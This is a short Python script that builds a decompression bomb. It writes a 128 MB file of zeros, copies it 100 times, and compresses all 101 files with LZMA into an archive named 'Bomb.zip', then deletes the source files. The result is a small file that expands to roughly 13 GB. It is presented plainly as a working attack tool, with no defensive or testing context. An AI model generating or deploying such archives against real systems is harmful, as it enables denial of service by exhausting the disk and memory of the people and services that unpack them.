import os
import shutil
import zipfile

n = 100
COMPRESSION = zipfile.ZIP_LZMA


def safe_delete(path):
    if os.path.exists(path):
        os.remove(path)


original_file = "data.bin"

with open(original_file, "wb") as f:
    f.write(b"0" * 1024 * 1024 * 128)

print(f"Created: {original_file}")


copies = []

for i in range(1, n + 1):  
    copy_name = f"copy_{i}.bin"
    shutil.copy(original_file, copy_name)
    copies.append(copy_name)

print(f"Created {len(copies)} copies") 


final_zip = "Bomb.zip"

with zipfile.ZipFile(
    final_zip,
    "w",
    compression=COMPRESSION,
    compresslevel=9
) as zipf:

    zipf.write(original_file)

    for file in copies:
        zipf.write(file)

print(f"Created zip: {final_zip}")


safe_delete(original_file)

for file in copies:
    safe_delete(file)

print("Deleted source files")

print(f"Done. Final output: {final_zip}")